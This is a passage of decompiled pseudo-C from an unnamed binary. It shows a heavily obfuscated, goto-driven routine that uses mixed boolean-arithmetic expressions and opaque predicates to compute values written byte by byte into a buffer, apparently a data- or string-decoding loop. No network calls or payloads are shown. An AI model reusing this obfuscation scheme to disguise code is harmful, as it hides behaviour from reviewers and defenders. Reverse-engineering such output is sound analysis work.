code_r0x00416334;\n                    }\n                    fcn.00405830();\n                    uVar3 = uStackY10604;\n                    uVar2 = uStackY10608;\n                    if (uVar1 == uVar6 + iStackY3656) {\n                        uStackY3552 = uStackY10612;\n                        uStackY3553 = uStackY10597;\n                        uStackY3560 = uStackY10597;\n                        uStackY3564 = uStackY10612 + 0xfefb3590;\n                        iStackY3568 = (uStackY3560 + uStackY3564) -\n                                      ((uStackY3560 & uStackY3564) + (uStackY3564 & uStackY3560));\n                        uStackY10598 = iStackY3568 + 0x10;\n                        goto code_r0x004163d0;\n                    }\n                    fcn.00405830();\n                    uVar1 = uStackY10604;\n                    uVar6 = uStackY10608;\n                    if (uVar3 == uVar2 + iStackY3548) {\n                        uStackY3432 = uStackY10612;\n                        uStackY3433 = uStackY10597;\n                        uStackY3440 = uStackY10597;\n                        uStackY3444 = uStackY10612 + 0xdc408d40;\n                        iStackY3448 = (uStackY3440 + uStackY3444) -\n                                      ((uStackY3440 & uStackY3444) + (uStackY3444 & uStackY3440));\n                        uStackY10598 = iStackY3448 + 0x40;\n                        goto code_r0x004163e2;\n                    }\n                    fcn.00405830();\n                    uVar3 = uStackY10604;\n                    uVar2 = uStackY10608;\n                    if (uVar1 == uVar6 + iStackY3340) {\n                        uStackY3312 = uStackY10612;\n                        uStackY3313 = uStackY10597;\n                        uStackY3320 = uStackY10597;\n                        uStackY3324 = uStackY10612 + 0xb985e4f0;\n                        iStackY3328 = (uStackY3320 + uStackY3324) -\n                                      ((uStackY3320 & uStackY3324) + (uStackY3324 & uStackY3320));\n                        uStackY10598 = iStackY3328 + 0x70;\n                        goto code_r0x0041649f;\n                    }\n                    fcn.00405830();\n                    uVar1 = uStackY10604;\n                    uVar6 = uStackY10608;\n                    if (uVar3 == uVar2 + iStackY3232) {\n                        uStackY3192 = uStackY10612;\n                        uStackY3193 = uStackY10597;\n                        uStackY3200 = uStackY10597;\n                        uStackY3204 = uStackY10612 + 0x96cb3ca0;\n                        iStackY3208 = (uStackY3200 + uStackY3204) -\n                                      ((uStackY3200 & uStackY3204) + (uStackY3204 & uStackY3200));\n                        uStackY10598 = iStackY3208 + 0xa0;\n                        goto code_r0x00416560;\n                    }\n                    fcn.00405830();\n                    uVar3 = uStackY10604;\n                    uVar2 = uStackY10608;\n                    if (uVar1 == uVar6 + iStackY3124) {\n                        uStackY3072 = uStackY10612;\n                        uStackY3073 = uStackY10597;\n                        uStackY3080 = uStackY10597;\n                        uStackY3084 = uStackY10612 + 0x74109450;\n                        iStackY3088 = (uStackY3080 + uStackY3084) -\n                                      ((uStackY3080 & uStackY3084) + (uStackY3084 & uStackY3080));\n                        uStackY10598 = iStackY3088 - 0x30;\n                        goto code_r0x00416612;\n                    }\n                    fcn.00405830();\n                    uVar6 = uStackY10608;\n                } while (uVar3 == uVar2 + iStackY3032);\n                fcn.00405830();\n                uVar6 = uVar6 + iStackY2880;\n                uStackY10604 = uVar6;\n                fcn.00405830();\n                uVar1 = uStackY10604;\n                uVar6 = uVar6 + iStackY2844;\n                uStackY10608 = uVar6;\n                fcn.00405830();\n                uVar3 = uStackY10604;\n                uVar2 = uStackY10608;\n                if (uVar1 < uVar6 + iStackY2692) {\n                    uStackY2652 = uStackY10612;\n                    uStackY2653 = uStackY10597;\n                    uStackY2660 = uStackY10597;\n                    uStackY2664 = uStackY10612 + 0x9d3def88;\n                    iStackY2668 = (uStackY2660 + uStackY2664) -\n                                  ((uStackY2660 & uStackY2664) + (uStackY2664 & uStackY2660));\n                    uStackY10598 = iStackY2668 + 0x48;\n                    goto code_r0x00413640;\n                }\n                fcn.00405830();\n                uVar1 = uStackY10604;\n                uVar6 = uStackY10608;\n                if (uVar3 < uVar2 + iStackY2584) {\n                    uStackY2532 = uStackY10612;\n                    uStackY2533 = uStackY10597;\n                    uStackY2540 = uStackY10597;\n                    uStackY2544 = uStackY10612 + 0x7a834738;\n                    iStackY2548 = (uStackY2540 + uStackY2544) -\n                                  ((uStackY2540 & uStackY2544) + (uStackY2544 & uStackY2540));\n                    uStackY10598 = iStackY2548 + 0x78;\n                    goto code_r0x0041365a;\n                }\n                fcn.00405830();\n                uVar3 = uStackY10604;\n                uVar2 = uStackY10608;\n                if (uVar1 < uVar6 + iStackY2492) {\n                    uStackY2412 = uStackY10612;\n                    uStackY2413 = uStackY10597;\n                    uStackY2420 = uStackY10597;\n                    uStackY2424 = uStackY10612 + 0x57c89ee8;\n                    iStackY2428 = (uStackY2420 + uStackY2424) -\n                                  ((uStackY2420 & uStackY2424) + (uStackY2424 & uStackY2420));\n                    uStackY10598 = iStackY2428 + 0xa8;\n                    goto code_r0x00413686;\n                }\n                fcn.00405830();\n                uVar1 = uStackY10604;\n                uVar6 = uStackY10608;\n                if (uVar3 < uVar2 + iStackY2384) {\n                    uStackY2292 = uStackY10612;\n                    uStackY2293 = uStackY10597;\n                    uStackY2300 = uStackY10597;\n                    uStackY2304 = uStackY10612 + 0x350df698;\n                    iStackY2308 = (uStackY2300 + uStackY2304) -\n                                  ((uStackY2300 & uStackY2304) + (uStackY2304 & uStackY2300));\n                    uStackY10598 = iStackY2308 - 0x28;\n                    goto code_r0x00413ef5;\n                }\n                fcn.00405830();\n                uVar3 = uStackY10604;\n                uVar2 = uStackY10608;\n                if (uVar1 < uVar6 + iStackY2276) break;\n                fcn.00405830();\n                uVar1 = uStackY10604;\n                uVar6 = uStackY10608;\n                if (uVar3 < uVar2 + iStackY2168) {\n                    uStackY2052 = uStackY10612;\n                    uStackY2053 = uStackY10597;\n                    uStackY2060 = uStackY10597;\n                    uStackY2064 = uStackY10612 + 0xef98a5f8;\n                    iStackY2068 = (uStackY2060 + uStackY2064) -\n                                  ((uStackY2060 & uStackY2064) + (uStackY2064 & uStackY2060));\n                    uStackY10598 = iStackY2068 + 0x38;\n                    goto code_r0x00414fd9;\n                }\n                fcn.00405830();\n                uVar3 = uStackY10604;\n                uVar2 = uStackY10608;\n                if (uVar1 < uVar6 + iStackY1960) {\n                    uStackY1932 = uStackY10612;\n                    uStackY1933 = uStackY10597;\n                    uStackY1940 = uStackY10597;\n                    uStackY1944 = uStackY10612 + 0xccddfda8;\n                    iStackY1948 = (uStackY1940 + uStackY1944) -\n                                  ((uStackY1940 & uStackY1944) + (uStackY1944 & uStackY1940));\n                    uStackY10598 = iStackY1948 + 0x68;\n                    goto code_r0x0041587a;\n                }\n                fcn.00405830();\n                uVar1 = uStackY10604;\n                uVar6 = uStackY10608;\n                if (uVar3 < uVar2 + iStackY1852) {\n                    uStackY1812 = uStackY10612;\n                    uStackY1813 = uStackY10597;\n                    uStackY1820 = uStackY10597;\n                    uStackY1824 = uStackY10612 + 0xaa235558;\n                    iStackY1828 = (uStackY1820 + uStackY1824) -\n                                  ((uStackY1820 & uStackY1824) + (uStackY1824 & uStackY1820));\n                    uStackY10598 = iStackY1828 + 0x98;\n                    goto code_r0x00416115;\n                }\n                fcn.00405830();\n                uVar3 = uStackY10604;\n                uVar2 = uStackY10608;\n                if (uVar1 < uVar6 + iStackY1744) {\n                    uStackY1692 = uStackY10612;\n                    uStackY1693 = uStackY10597;\n                    uStackY1700 = uStackY10597;\n                    uStackY1704 = uStackY10612 + 0x8768ad08;\n                    iStackY1708 = (uStackY1700 + uStackY1704) -\n                                  ((uStackY1700 & uStackY1704) + (uStackY1704 & uStackY1700));\n                    uStackY10598 = iStackY1708 - 0x38;\n                    goto code_r0x00416158;\n                }\n                fcn.00405830();\n                uVar6 = uStackY10608;\n                if (uVar2 + iStackY1652 <= uVar3) {\n                    fcn.00405830();\n                    uVar6 = uVar6 + iStackY1500;\n                    uStackY10604 = uVar6;\n                    fcn.00405830();\n                    uVar1 = uStackY10604;\n                    uVar6 = uVar6 + iStackY1464;\n                    uStackY10608 = uVar6;\n                    fcn.00405830();\n                    uVar3 = uStackY10604;\n                    uVar2 = uStackY10608;\n                    if (uVar6 + iStackY1312 < uVar1) {\n                        uStackY1272 = uStackY10612;\n                        uStackY1273 = uStackY10597;\n                        uStackY1280 = uStackY10597;\n                        uStackY1284 = uStackY10612 + 0xb0960840;\n                        iStackY1288 = (uStackY1280 + uStackY1284) -\n                                      ((uStackY1280 & uStackY1284) + (uStackY1284 & uStackY1280));\n                        uStackY10598 = iStackY1288 + 0x40;\n                        goto code_r0x00416612;\n                    }\n                    fcn.00405830();\n                    uVar1 = uStackY10604;\n                    uVar6 = uStackY10608;\n                    if (uVar2 + iStackY1204 < uVar3) {\n                        uStackY1152 = uStackY10612;\n                        uStackY1153 = uStackY10597;\n                        uStackY1160 = uStackY10597;\n                        uStackY1164 = uStackY10612 + 0x8ddb5ff0;\n                        iStackY1168 = (uStackY1160 + uStackY1164) -\n                                      ((uStackY1160 & uStackY1164) + (uStackY1164 & uStackY1160));\n                        uStackY10598 = iStackY1168 + 0x70;\n                        goto code_r0x00416560;\n                    }\n                    fcn.00405830();\n                    uVar3 = uStackY10604;\n                    uVar2 = uStackY10608;\n                    if (uVar6 + iStackY1112 < uVar1) {\n                        uStackY1032 = uStackY10612;\n                        uStackY1033 = uStackY10597;\n                        uStackY1040 = uStackY10597;\n                        uStackY1044 = uStackY10612 + 0x6b20b7a0;\n                        iStackY1048 = (uStackY1040 + uStackY1044) -\n                                      ((uStackY1040 & uStackY1044) + (uStackY1044 & uStackY1040));\n                        uStackY10598 = iStackY1048 + 0xa0;\n                        goto code_r0x0041649f;\n                    }\n                    fcn.00405830();\n                    uVar1 = uStackY10604;\n                    uVar6 = uStackY10608;\n                    if (uVar2 + iStackY1004 < uVar3) {\n                        uStackY912 = uStackY10612;\n                        uStackY913 = uStackY10597;\n                        uStackY920 = uStackY10597;\n                        uStackY924 = uStackY10612 + 0x48660f50;\n                        iStackY928 = (uStackY920 + uStackY924) - ((uStackY920 & uStackY924) + (uStackY924 & uStackY920))\n                        ;\n                        uStackY10598 = iStackY928 - 0x30;\n                        goto code_r0x004163e2;\n                    }\n                    fcn.00405830();\n                    uVar3 = uStackY10604;\n                    uVar2 = uStackY10608;\n                    if (uVar6 + iStackY896 < uVar1) {\n                        uStackY792 = uStackY10612;\n                        uStackY793 = uStackY10597;\n                        uStackY800 = uStackY10597;\n                        uStackY804 = uStackY10612 + 0x25ab6700;\n                        iStackY808 = (uStackY800 + uStackY804) - ((uStackY800 & uStackY804) + (uStackY804 & uStackY800))\n                        ;\n                        uStackY10598 = iStackY808;\n                        goto code_r0x004163d0;\n                    }\n                    fcn.00405830();\n                    uVar1 = uStackY10604;\n                    uVar6 = uStackY10608;\n                    if (uVar2 + iStackY788 < uVar3) {\n                        uStackY672 = uStackY10612;\n                        uStackY673 = uStackY10597;\n                        uStackY680 = uStackY10597;\n                        uStackY684 = uStackY10612 + 0x2f0beb0;\n                        iStackY688 = (uStackY680 + uStackY684) - ((uStackY680 & uStackY684) + (uStackY684 & uStackY680))\n                        ;\n                        uStackY10598 = iStackY688 + 0x30;\n                        goto code_r0x00416334;\n                    }\n                    fcn.00405830();\n                    uVar3 = uStackY10604;\n                    uVar2 = uStackY10608;\n                    if (uVar6 + iStackY580 < uVar1) {\n                        uStackY552 = uStackY10612;\n                        uStackY553 = uStackY10597;\n                        uStackY560 = uStackY10597;\n                        uStackY564 = uStackY10612 + 0xe0361660;\n                        iStackY568 = (uStackY560 + uStackY564) - ((uStackY560 & uStackY564) + (uStackY564 & uStackY560))\n                        ;\n                        uStackY10598 = iStackY568 + 0x60;\n                        goto code_r0x0041628c;\n                    }\n                    fcn.00405830();\n                    uVar1 = uStackY10604;\n                    uVar6 = uStackY10608;\n                    if (uVar2 + iStackY472 < uVar3) {\n                        uStackY432 = uStackY10612;\n                        uStackY433 = uStackY10597;\n                        uStackY440 = uStackY10597;\n                        uStackY444 = uStackY10612 + 0xbd7b6e10;\n                        iStackY448 = (uStackY440 + uStackY444) - ((uStackY440 & uStackY444) + (uStackY444 & uStackY440))\n                        ;\n                        uStackY10598 = iStackY448 + 0x90;\n                        goto code_r0x0041627d;\n                    }\n                    fcn.00405830();\n                    uVar3 = uStackY10604;\n                    uVar2 = uStackY10608;\n                    if (uVar6 + iStackY364 < uVar1) {\n                        uStackY312 = uStackY10612;\n                        uStackY313 = uStackY10597;\n                        uStackY320 = uStackY10597;\n                        uStackY324 = uStackY10612 + 0x9ac0c5c0;\n                        iStackY328 = (uStackY320 + uStackY324) - ((uStackY320 & uStackY324) + (uStackY324 & uStackY320))\n                        ;\n                        uStackY10598 = iStackY328 - 0x40;\n                        goto code_r0x004161fd;\n                    }\n                    fcn.00405830();\n                    uVar6 = uStackY10608;\n                    if (uVar3 <= uVar2 + iStackY256) {\n                        fcn.00405830();\n                        uVar6 = uVar6 + iStackY120;\n                        uStackY10604 = uVar6;\n                        fcn.00405830();\n                        uStackY10608 = uVar6 + iStackY84;\n                    }\n                }\n            }\n            uStackY2172 = uStackY10612;\n            uStackY2173 = uStackY10597;\n            uStackY2180 = uStackY10597;\n            uStackY2184 = uStackY10612 + 0x12534e48;\n            iStackY2188 = (uStackY2180 + uStackY2184) - ((uStackY2180 & uStackY2184) + (uStackY2184 & uStackY2180));\n            uStackY10598 = iStackY2188 + 8;\n        }\n        fcn.00405830();\n        uVar3 = uStackY10604;\n        uVar1 = uStackY10608;\n        if (uVar2 < uVar6 + iStackY8156) {\n            uStackY10452 = uStackY10612;\n            uStackY10453 = uStackY10597;\n            uStackY10460 = uStackY10597;\n            uStackY10464 = uStackY10612 + 0x6ea2abd8;\n            iStackY10468 = (uStackY10460 + uStackY10464) -\n                           ((uStackY10460 & uStackY10464) + (uStackY10464 & uStackY10460));\n            uStackY10598 = iStackY10468 + 0x18;\ncode_r0x00414fd9:\n            iVar5 = uStackY10604 + uStackY10608;\n            fcn.00405830();\n            uVar2 = uStackY10604;\n            uVar6 = uStackY10608;\n            if (iVar5 == iStackY6964) {\n                uStackY4192 = uStackY10612;\n                uStackY4193 = uStackY10597;\n                uStackY4200 = uStackY10597;\n                uStackY4204 = uStackY10612 + 0xcf5b2770;\n                iStackY4208 = (uStackY4200 + uStackY4204) - ((uStackY4200 & uStackY4204) + (uStackY4204 & uStackY4200));\n                uStackY10598 = (iStackY4208 + -0x10) - *(puStackY10596 + uStackY10612);\ncode_r0x0041649f:\n                uStackY4172 = uStackY10612;\n                uStackY4173 = uStackY10597;\n                uStackY4180 = uStackY10597;\n                uStackY4184 = uStackY10612 + 0x3dfdd348;\n                iStackY4188 = (uStackY4180 + uStackY4184) - ((uStackY4180 & uStackY4184) + (uStackY4184 & uStackY4180));\n                *(puStackY10596 + uStackY10612) = iStackY4188 + '\\b';\n                uStackY10608 = uStackY10608 + 1;\n                uStackY10612 = (uStackY10612 - *(puStackY10596 + uStackY10612)) - uStackY10608;\ncode_r0x00416560:\n                uStackY4152 = uStackY10612;\n                uStackY4153 = uStackY10597;\n                uStackY4160 = uStackY10597;\n                uStackY4164 = uStackY10612 + 0xaca07f20;\n                iStackY4168 = (uStackY4160 + uStackY4164) - ((uStackY4160 & uStackY4164) + (uStackY4164 & uStackY4160));\n                *(puStackY10596 + uStackY10612) = iStackY4168 + ' ';\n                uStackY10604 = uStackY10604 + 1;\n                uStackY10612 = (uStackY10612 - 1) - uStackY10604;\n                goto code_r0x00416612;\n            }\n            fcn.00405830();\n            uVar3 = uStackY10604;\n            uVar1 = uStackY10608;\n            if (uVar6 + iStackY6828 < uVar2) {\n                uStackY6772 = uStackY10612;\n                uStackY6773 = uStackY10597;\n                uStackY6780 = uStackY10597;\n                uStackY6784 = uStackY10612 + 0x5cc2f278;\n                iStackY6788 = (uStackY6780 + uStackY6784) - ((uStackY6780 & uStackY6784) + (uStackY6784 & uStackY6780));\n                uStackY10598 = iStackY6788 + 0xb8;\ncode_r0x0041587a:\n                uVar2 = uStackY10604;\n                fcn.00405830();\n                uVar1 = uStackY10604;\n                uVar6 = uStackY10608;\n                if (uVar2 < uStackY5664) {\n                    fcn.00405830();\n                    uVar3 = uStackY10604;\n                    uVar2 = uStackY10608;\n                    if (uVar6 + iStackY5512 < uVar1) {\n                        uStackY5472 = uStackY10612;\n                        uStackY5473 = uStackY10597;\n                        uStackY5480 = uStackY10597;\n                        uStackY5484 = uStackY10612 + 0x701b0b30;\n                        iStackY5488 = (uStackY5480 + uStackY5484) -\n                                      ((uStackY5480 & uStackY5484) + (uStackY5484 & uStackY5480));\n                        uStackY10598 = iStackY5488 + 0xb0;\n                    }\n                    else {\n                        fcn.00405830();\n                        uVar1 = uStackY10604;\n                        uVar6 = uStackY10608;\n                        if (uVar3 == uVar2 + 1) {\n                            uStackY5352 = uStackY10612;\n                            uStackY5353 = uStackY10597;\n                            uStackY5360 = uStackY10597;\n                            uStackY5364 = uStackY10612 + 0x4d6062e0;\n                            iStackY5368 = (uStackY5360 + uStackY5364) -\n                                          ((uStackY5360 & uStackY5364) + (uStackY5364 & uStackY5360));\n                            uStackY10598 = iStackY5368 - 0x20;\n                            goto code_r0x00416612;\n                        }\n                        fcn.00405830();\n                        uVar3 = uStackY10604;\n                        uVar2 = uStackY10608;\n                        if (uVar1 == uVar6 + (uStackY5312 & 1) + 1) {\n                            uStackY5232 = uStackY10612;\n                            uStackY5233 = uStackY10597;\n                            uStackY5240 = uStackY10597;\n                            uStackY5244 = uStackY10612 + 0x2aa5ba90;\n                            iStackY5248 = (uStackY5240 + uStackY5244) -\n                                          ((uStackY5240 & uStackY5244) + (uStackY5244 & uStackY5240));\n                            uStackY10598 = iStackY5248 + 0x10;\n                            goto code_r0x00416560;\n                        }\n                        fcn.00405830();\n                        uVar1 = uStackY10604;\n                        uVar6 = uStackY10608;\n                        if (uVar3 == uVar2 + uStackY5204 % 3 + 1) {\n                            uStackY5112 = uStackY10612;\n                            uStackY5113 = uStackY10597;\n                            uStackY5120 = uStackY10597;\n                            uStackY5124 = uStackY10612 + 0x7eb1240;\n                            iStackY5128 = (uStackY5120 + uStackY5124) -\n                                          ((uStackY5120 & uStackY5124) + (uStackY5124 & uStackY5120));\n                            uStackY10598 = iStackY5128 + 0x40;\n                            goto code_r0x0041649f;\n                        }\n                        fcn.00405830();\n                        uVar3 = uStackY10604;\n                        uVar2 = uStackY10608;\n                        if (uVar1 == uVar6 + (uStackY5096 & 3) + 1) {\n                            uStackY4992 = uStackY10612;\n                            uStackY4993 = uStackY10597;\n                            uStackY5000 = uStackY10597;\n                            uStackY5004 = uStackY10612 + 0xe53069f0;\n                            iStackY5008 = (uStackY5000 + uStackY5004) -\n                                          ((uStackY5000 & uStackY5004) + (uStackY5004 & uStackY5000));\n                            uStackY10598 = iStackY5008 + 0x70;\n                            goto code_r0x004163e2;\n                        }\n                        fcn.00405830();\n                        uVar1 = uStackY10604;\n                        uVar6 = uStackY10608;\n                        if (uVar3 == uVar2 + uStackY4988 % 5 + 1) {\n                            uStackY4872 = uStackY10612;\n                            uStackY4873 = uStackY10597;\n                            uStackY4880 = uStackY10597;\n                            uStackY4884 = uStackY10612 + 0xc275c1a0;\n                            iStackY4888 = (uStackY4880 + uStackY4884) -\n                                          ((uStackY4880 & uStackY4884) + (uStackY4884 & uStackY4880));\n                            uStackY10598 = iStackY4888 + 0xa0;\n                            goto code_r0x004163d0;\n                        }\n                        fcn.00405830();\n                        uVar3 = uStackY10604;\n                        uVar2 = uStackY10608;\n                        if (uVar1 == uVar6 + uStackY4780 % 6 + 1) {\n                            uStackY4752 = uStackY10612;\n                            uStackY4753 = uStackY10597;\n                            uStackY4760 = uStackY10597;\n                            uStackY4764 = uStackY10612 + 0x9fbb1950;\n                            iStackY4768 = (uStackY4760 + uStackY4764) -\n                                          ((uStackY4760 & uStackY4764) + (uStackY4764 & uStackY4760));\n                            uStackY10598 = iStackY4768 - 0x30;\n                            goto code_r0x00416334;\n                        }\n                        fcn.00405830();\n                        uVar1 = uStackY10604;\n                        uVar6 = uStackY10608;\n                        if (uVar3 == uVar2 + uStackY4672 % 7 + 1) {\n                            uStackY4632 = uStackY10612;\n                            uStackY4633 = uStackY10597;\n                            uStackY4640 = uStackY10597;\n                            uStackY4644 = uStackY10612 + 0x7d007100;\n                            iStackY4648 = (uStackY4640 + uStackY4644) -\n                                          ((uStackY4640 & uStackY4644) + (uStackY4644 & uStackY4640));\n                            uStackY10598 = iStackY4648;\n                            goto code_r0x0041628c;\n                        }\n                        fcn.00405830();\n                        uVar3 = uStackY10604;\n                        uVar2 = uStackY10608;\n                        if (uVar1 == uVar6 + (uStackY4580 & 7) + 1) {\n                            uStackY4512 = uStackY10612;\n                            uStackY4513 = uStackY10597;\n                            uStackY4520 = uStackY10597;\n                            uStackY4524 = uStackY10612 + 0x5a45c8b0;\n                            iStackY4528 = (uStackY4520 + uStackY4524) -\n                                          ((uStackY4520 & uStackY4524) + (uStackY4524 & uStackY4520));\n                            uStackY10598 = iStackY4528 + 0x30;\n                            goto code_r0x0041627d;\n                        }\n                        fcn.00405830();\n                        if (uVar3 == uVar2 + uStackY4472 % 9 + 1) {\n                            uStackY4392 = uStackY10612;\n                            uStackY4393 = uStackY10597;\n                            uStackY4400 = uStackY10597;\n                            uStackY4404 = uStackY10612 + 0x378b2060;\n                            iStackY4408 = (uStackY4400 + uStackY4404) -\n                                          ((uStackY4400 & uStackY4404) + (uStackY4404 & uStackY4400));\n                            uStackY10598 = iStackY4408 + 0x60;\n                            goto code_r0x004161fd;\n                        }\n                    }\ncode_r0x00416115:\n                    uVar6 = uStackY10608;\n                    fcn.00405830();\n                    if (uStackY4364 <= uVar6) {\n                        uStackY4272 = uStackY10612;\n                        uStackY4273 = uStackY10597;\n                        uStackY4280 = uStackY10597;\n                        uStackY4284 = uStackY10612 + 0x14d07810;\n                        iStackY4288 = (uStackY4280 + uStackY4284) -\n                                      ((uStackY4280 & uStackY4284) + (uStackY4284 & uStackY4280));\n                        uStackY10598 = (iStackY4288 + -0x70) * '\\x02';\n                        goto code_r0x004161fd;\n                    }\ncode_r0x00416158:\n                    *(puStackY10596 + uStackY10612) = uStackY10598;\n                }\n                else {\n                    uStackY4232 = uStackY10612;\n                    uStackY4233 = uStackY10597;\n                    uStackY4240 = uStackY10597;\n                    uStackY4244 = uStackY10612 + 0xf215cfc0;\n                    iStackY4248 = (uStackY4240 + uStackY4244) -\n                                  ((uStackY4240 & uStackY4244) + (uStackY4244 & uStackY4240));\n                    uStackY10598 = iStackY4248 + -0x40 + *(puStackY10596 + uStackY10612);\ncode_r0x00416334:\n                    uStackY4212 = uStackY10612;\n                    uStackY4213 = uStackY10597;\n                    uStackY4220 = uStackY10597;\n                    uStackY4224 = uStackY10612 + 0x60b87b98;\n                    iStackY4228 = (uStackY4220 + uStackY4224) -\n                                  ((uStackY4220 & uStackY4224) + (uStackY4224 & uStackY4220));\n                    *(puStackY10596 + uStackY10612) = iStackY4228 + -0x28;\n                    *(puStackY10596 + uStackY10612) = *(puStackY10596 + uStackY10612) + uStackY10598;\ncode_r0x004163d0:\n                    uStackY10604 = uStackY10608 + uStackY10604;\ncode_r0x004163e2:\n                    uStackY10612 = (uStackY10612 - 1) - uStackY10598;\n                }\n            }\n            else {\n                fcn.00405830();\n                uVar2 = uStackY10604;\n                uVar6 = uStackY10608;\n                if (uVar3 == uVar1 + 1) {\n                    uStackY6652 = uStackY10612;\n                    uStackY6653 = uStackY10597;\n                    uStackY6660 = uStackY10597;\n                    uStackY6664 = uStackY10612 + 0x3a084a28;\n                    iStackY6668 = (uStackY6660 + uStackY6664) -\n                                  ((uStackY6660 & uStackY6664) + (uStackY6664 & uStackY6660));\n                    uStackY10598 = iStackY6668 - 0x18;\ncode_r0x004161fd:\n                    uStackY4252 = uStackY10612;\n                    uStackY4253 = uStackY10597;\n                    uStackY4260 = uStackY10597;\n                    uStackY4264 = uStackY10612 + 0x837323e8;\n                    iStackY4268 = (uStackY4260 + uStackY4264) -\n                                  ((uStackY4260 & uStackY4264) + (uStackY4264 & uStackY4260));\n                    *(puStackY10596 + uStackY10612) = iStackY4268 + -0x58;\ncode_r0x0041627d:\n                    uStackY10608 = uStackY10608 + 1;\n                }\n                else {\n                    fcn.00405830();\n                    uVar3 = uStackY10604;\n                    uVar1 = uStackY10608;\n                    if (uVar2 == uVar6 + (uStackY6612 & 1) + 1) {\n                        uStackY6532 = uStackY10612;\n                        uStackY6533 = uStackY10597;\n                        uStackY6540 = uStackY10597;\n                        uStackY6544 = uStackY10612 + 0x174da1d8;\n                        iStackY6548 = (uStackY6540 + uStackY6544) -\n                                      ((uStackY6540 & uStackY6544) + (uStackY6544 & uStackY6540));\n                        uStackY10598 = iStackY6548 + 0x18;\n                        goto code_r0x0041627d;\n                    }\n                    fcn.00405830();\n                    uVar2 = uStackY10604;\n                    uVar6 = uStackY10608;\n                    if (uVar3 != uVar1 + uStackY6504 % 3 + 1) {\n                        fcn.00405830();\n                        uVar3 = uStackY10604;\n                        uVar1 = uStackY10608;\n                        if (uVar2 != uVar6 + (uStackY6396 & 3) + 1) {\n                            fcn.00405830();\n                            uVar2 = uStackY10604;\n                            uVar6 = uStackY10608;\n                            if (uVar3 == uVar1 + uStackY6288 % 5 + 1) {\n                                uStackY6172 = uStackY10612;\n                                uStackY6173 = uStackY10597;\n                                uStackY6180 = uStackY10597;\n                                uStackY6184 = uStackY10612 + 0xaf1da8e8;\n                                iStackY6188 = (uStackY6180 + uStackY6184) -\n                                              ((uStackY6180 & uStackY6184) + (uStackY6184 & uStackY6180));\n                                uStackY10598 = iStackY6188 + 0xa8;\n                                goto code_r0x004163d0;\n                            }\n                            fcn.00405830();\n                            uVar3 = uStackY10604;\n                            uVar1 = uStackY10608;\n                            if (uVar2 == uVar6 + uStackY6080 % 6 + 1) {\n                                uStackY6052 = uStackY10612;\n                                uStackY6053 = uStackY10597;\n                                uStackY6060 = uStackY10597;\n                                uStackY6064 = uStackY10612 + 0x8c630098;\n                                iStackY6068 = (uStackY6060 + uStackY6064) -\n                                              ((uStackY6060 & uStackY6064) + (uStackY6064 & uStackY6060));\n                                uStackY10598 = iStackY6068 - 0x28;\n                                goto code_r0x004163e2;\n                            }\n                            fcn.00405830();\n                            uVar2 = uStackY10604;\n                            uVar6 = uStackY10608;\n                            if (uVar3 == uVar1 + uStackY5988 % 7 + 1) {\n                                uStackY5932 = uStackY10612;\n                                uStackY5933 = uStackY10597;\n                                uStackY5940 = uStackY10597;\n                                uStackY5944 = uStackY10612 + 0x69a85848;\n                                iStackY5948 = (uStackY5940 + uStackY5944) -\n                                              ((uStackY5940 & uStackY5944) + (uStackY5944 & uStackY5940));\n                                uStackY10598 = iStackY5948 + 8;\n                                goto code_r0x0041649f;\n                            }\n                            fcn.00405830();\n                            uVar3 = uStackY10604;\n                            uVar1 = uStackY10608;\n                            if (uVar2 == uVar6 + (uStackY5880 & 7) + 1) {\n                                uStackY5812 = uStackY10612;\n                                uStackY5813 = uStackY10597;\n                                uStackY5820 = uStackY10597;\n                                uStackY5824 = uStackY10612 + 0x46edaff8;\n                                iStackY5828 = (uStackY5820 + uStackY5824) -\n                                              ((uStackY5820 & uStackY5824) + (uStackY5824 & uStackY5820));\n                                uStackY10598 = iStackY5828 + 0x38;\n                                goto code_r0x00416560;\n                            }\n                            fcn.00405830();\n                            if (uVar3 == uVar1 + uStackY5772 % 9 + 1) {\n                                uStackY5692 = uStackY10612;\n                                uStackY5693 = uStackY10597;\n                                uStackY5700 = uStackY10597;\n                                uStackY5704 = uStackY10612 + 0x243307a8;\n                                iStackY5708 = (uStackY5700 + uStackY5704) -\n                                              ((uStackY5700 & uStackY5704) + (uStackY5704 & uStackY5700));\n                                uStackY10598 = iStackY5708 + 0x68;\n                                goto code_r0x00416612;\n                            }\n                            goto code_r0x0041587a;\n                        }\n                        uStackY6292 = uStackY10612;\n                        uStackY6293 = uStackY10597;\n                        uStackY6300 = uStackY10597;\n                        uStackY6304 = uStackY10612 + 0xd1d85138;\n                        iStackY6308 = (uStackY6300 + uStackY6304) -\n                                      ((uStackY6300 & uStackY6304) + (uStackY6304 & uStackY6300));\n                        uStackY10598 = iStackY6308 + 0x78;\n                        goto code_r0x00416334;\n                    }\n                    uStackY6412 = uStackY10612;\n                    uStackY6413 = uStackY10597;\n                    uStackY6420 = uStackY10597;\n                    uStackY6424 = uStackY10612 + 0xf492f988;\n                    iStackY6428 = (uStackY6420 + uStackY6424) -\n                                  ((uStackY6420 & uStackY6424) + (uStackY6424 & uStackY6420));\n                    uStackY10598 = iStackY6428 + 0x48;\n                }\ncode_r0x0041628c:\n                uStackY10612 = uStackY10612 - 1;\n            }\n        }\n        else {\n            fcn.00405830();\n            uVar2 = uStackY10604;\n            uVar6 = uStackY10608;\n            if (uVar3 != uVar1 + 1) {\n                fcn.00405830();\n                uVar3 = uStackY10604;\n                uVar1 = uStackY10608;\n                if (uVar2 != uVar6 + (uStackY7912 & 1) + 1) {\n                    fcn.00405830();\n                    uVar2 = uStackY10604;\n                    uVar6 = uStackY10608;\n                    if (uVar3 != uVar1 + uStackY7804 % 3 + 1) {\n                        fcn.00405830();\n                        uVar3 = uStackY10604;\n                        uVar1 = uStackY10608;\n                        if (uVar2 != uVar6 + (uStackY7696 & 3) + 1) {\n                            fcn.00405830();\n                            uVar2 = uStackY10604;\n                            uVar6 = uStackY10608;\n                            if (uVar3 != uVar1 + uStackY7588 % 5 + 1) {\n                                fcn.00405830();\n                                uVar3 = uStackY10604;\n                                uVar1 = uStackY10608;\n                                if (uVar2 == uVar6 + uStackY7380 % 6 + 1) {\n                                    uStackY7352 = uStackY10612;\n                                    uStackY7353 = uStackY10597;\n                                    uStackY7360 = uStackY10597;\n                                    uStackY7364 = uStackY10612 + 0x790ae7e0;\n                                    iStackY7368 = (uStackY7360 + uStackY7364) -\n                                                  ((uStackY7360 & uStackY7364) + (uStackY7364 & uStackY7360));\n                                    uStackY10598 = iStackY7368 - 0x20;\n                      